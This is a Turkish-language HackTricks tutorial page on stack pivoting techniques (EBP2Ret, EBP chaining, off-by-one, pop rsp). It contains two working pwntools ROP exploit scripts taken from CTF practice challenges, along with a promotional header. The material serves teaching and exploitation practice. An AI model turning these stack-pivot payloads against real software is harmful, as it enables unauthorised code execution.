# Stack Pivoting - EBP2Ret - EBP chaining

<details>

<summary><strong>AWS hacklemeyi sıfırdan ileri seviyeye öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## Temel Bilgiler

Bu teknik, **Base Pointer (EBP)**'yi manipüle etme yeteneğini kullanarak EBP kaydının dikkatli bir şekilde kullanımı ve `leave; ret` komut dizisinin zincirleme yürütülmesini sağlar.

Hatırlatma olarak, **`leave`** temelde şunu ifade eder:
```
movl               %ebp, %esp
popl               %ebp
ret
```
Ve **EBP, EIP'den önce stack'te** olduğundan, stack'i kontrol ederek EBP'yi kontrol etmek mümkündür.

### EBP2Ret

Bu teknik, **EBP kaydını değiştirebilirken EIP kaydını doğrudan değiştirme şansınız olmadığında** özellikle yararlıdır. Fonksiyonların çalışmayı bitirdiklerindeki davranışlarını kullanır.

`fvuln`'ün yürütülmesi sırasında, stack'e sahte bir EBP enjekte ederek, bu sahte EBP'nin ESP'nin işaret ettiği bellek alanına (pop işlemi için 4 bayt eklenerek) shellcode'unuzun adresinin bulunduğu bir yere işaret etmesini sağlarsanız, EIP'yi dolaylı olarak kontrol edebilirsiniz. `fvuln` geri döndüğünde, ESP bu hazırlanmış konuma ayarlanır ve ardışık pop işlemi ESP'yi 4 azaltarak, **efektif olarak saldırganın oraya sakladığı bir adrese işaret etmesini sağlar.**\
Dikkat edin ki **2 adresi bilmelisiniz**: ESP'nin gideceği adres ve ESP'nin işaret ettiği adrese yazmanız gereken adres.

#### Saldırı Oluşturma

İlk olarak, **keyfi veri / adresler yazabileceğiniz bir adresi bilmelisiniz**. ESP buraya işaret edecek ve **ilk `ret`'i çalıştıracak**.

Ardından, **keyfi kodu çalıştıracak `ret`'in kullandığı adresi bilmelisiniz**. Şunları kullanabilirsiniz:

* Geçerli bir [**ONE\_GADGET**](https://github.com/david942j/one\_gadget) adresi.
* **`system()`** adresi takip eden **4 gereksiz bayt** ve `"/bin/sh"` adresi (x86 bit).
* Bir **`jump esp;`** cihazının ([**ret2esp**](../rop-return-oriented-programing/ret2esp-ret2reg/)) adresi ve yürütülecek **shellcode**'un adresi.
* Bazı [**ROP**](../rop-return-oriented-programing/) zinciri

Kontrol edilen belleğin bu adreslerinden önce, `leave` talimatının `pop` kısmından dolayı **`4` bayt** olmalıdır. Bu 4B'yi kullanarak **ikinci sahte EBP**'yi ayarlamak ve yürütümü kontrol etmeye devam etmek mümkün olabilir.

#### Bir-Byte Hatası Sömürüsü

Bu tekniğin belirli bir varyantı olan "Bir-Byte Hatası Sömürüsü" bilinmektedir. Yalnızca EBP'nin en az anlamlı baytını değiştirebileceğiniz durumlarda kullanılır. Bu durumda, **`ret` ile atlanacak adresi saklayan bellek konumu, ilk üç baytı EBP ile paylaşmalıdır**, daha kısıtlanmış koşullarla benzer bir manipülasyon için izin verir.\
Genellikle, mümkün olduğunca uzağa atlamak için bayt 0x00 değiştirilir.

Ayrıca, stack'te bir RET kaydırıcısı kullanmak ve gerçek ROP zincirini en sona koymak yaygındır, böylece yeni ESP'nin RET KAYDIRICISI'nın içine işaret etme olasılığı daha yüksek olur ve son ROP zinciri yürütülür.

### **EBP Zincirleme**

Bu nedenle, stack'in `EBP` girişine kontrol edilen bir adres ve `EIP`'e `leave; ret` adresi koyarak, `ESP`'yi stack'teki kontrol edilen `EBP` adresine **taşımak mümkündür**.

Şimdi, **`ESP`** istenilen bir adrese işaret ederek kontrol ediliyor ve yürütülecek sonraki talimat bir `RET`. Bunu kötüye kullanmak için, kontrol edilen ESP yerine şunu yerleştirmek mümkündür:

* **`&(sonraki sahte EBP)`** -> Yeni EBP'yi yükleyin çünkü `leave` talimatındaki `pop ebp`
* **`system()`** -> `ret` tarafından çağrılır
* **`&(leave;ret)`** -> sistem bittiğinde çağrılır, ESP'yi sahte EBP'ye taşıyacak ve yeniden başlayacak
* **`&("/bin/sh")`**-> `system` için parametre

Temelde programın akışını kontrol etmek için birkaç sahte EBP zincirlemek mümkündür.

Aslında, bu bir [ret2lib](../rop-return-oriented-programing/ret2lib/) gibi, ancak görünür bir faydası olmayan daha karmaşık bir tekniktir, ancak bazı sınırlı durumlarda ilginç olabilir.

Ayrıca, burada bu tekniği bir **stack sızıntısı** ile kazanan bir işlevi çağırmak için kullanan bir [**zorluk örneği**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave) bulunmaktadır. Bu, sayfadaki final yüküdür:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of anoter fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (just get to RBP)

payload += flat(
buffer,         # Load leak address in RBP
LEAVE_RET       # Use leave ro move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
## EBP kullanılmayabilir

[**Bu gönderide açıklandığı gibi**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#off-by-one-1), bir ikili dosya bazı optimizasyonlarla derlenmişse, **EBP hiçbir zaman ESP'yi kontrol etmeyecek** şekilde derlenir, bu nedenle EBP'yi kontrol ederek çalışan herhangi bir saldırı temelde başarısız olacaktır çünkü gerçek bir etkisi olmayacaktır.\
Bu, ikili dosya optimize edilmişse **prolog ve epilog değişikliklerinin** olması nedeniyledir.

* **Optimize Edilmemiş:**
```bash
push   %ebp         # save ebp
mov    %esp,%ebp    # set new ebp
sub    $0x100,%esp  # increase stack size
.
.
.
leave               # restore ebp (leave == mov %ebp, %esp; pop %ebp)
ret                 # return
```
* **Optimize Edilmiş:**
```bash
push   %ebx         # save ebx
sub    $0x100,%esp  # increase stack size
.
.
.
add    $0x10c,%esp  # reduce stack size
pop    %ebx         # restore ebx
ret                 # return
```
## RSP'yi kontrol etmenin diğer yolları

### **`pop rsp`** cihazı

Bu teknik kullanılarak bir örnek bulabilirsiniz. Bu zorluk için belirli 2 argümanla bir işlevi çağırmak gerekiyordu ve bir **`pop rsp` cihazı** bulunmaktaydı ve bir **yığından sızıntı** vardı:
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg \<rag>, rsp cihazı
```
pop <reg>                <=== return pointer
<reg value>
xchg <rag>, rsp
```
### jmp esp

ret2esp tekniğini buradan kontrol edin:

{% content-ref url="../rop-return-oriented-programing/ret2esp-ret2reg/" %}
[ret2esp-ret2reg](../rop-return-oriented-programing/ret2esp-ret2reg/)
{% endcontent-ref %}

## Referanslar ve Diğer Örnekler

* [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
* [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)
* [https://guyinatuxedo.github.io/17-stack\_pivot/dcquals19\_speedrun4/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/dcquals19\_speedrun4/index.html)
* 64 bit, ret sled ile başlayan bir rop zinciri ile birlikte bir off by one istismarı
* [https://guyinatuxedo.github.io/17-stack\_pivot/insomnihack18\_onewrite/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/insomnihack18\_onewrite/index.html)
* 64 bit, relro, canary, nx ve pie olmayan bir program. Program, yığın veya pie için bir sızıntı sağlar ve bir qword'un WWW'sini verir. İlk olarak yığın sızıntısını alın ve WWW'yi kullanarak geri gidin ve pie sızıntısını alın. Sonra WWW'yi kullanarak `.fini_array` girişlerini istismar ederek ve `__libc_csu_fini`'yi çağırarak sonsuz bir döngü oluşturun ([daha fazla bilgi için buraya bakın](../arbitrary-write-2-exec/www2exec-.dtors-and-.fini\_array.md)). Bu "sonsuz" yazma istismar edilerek, bir ROP zinciri .bss içine yazılır ve RBP ile dönerek onu çağırır.
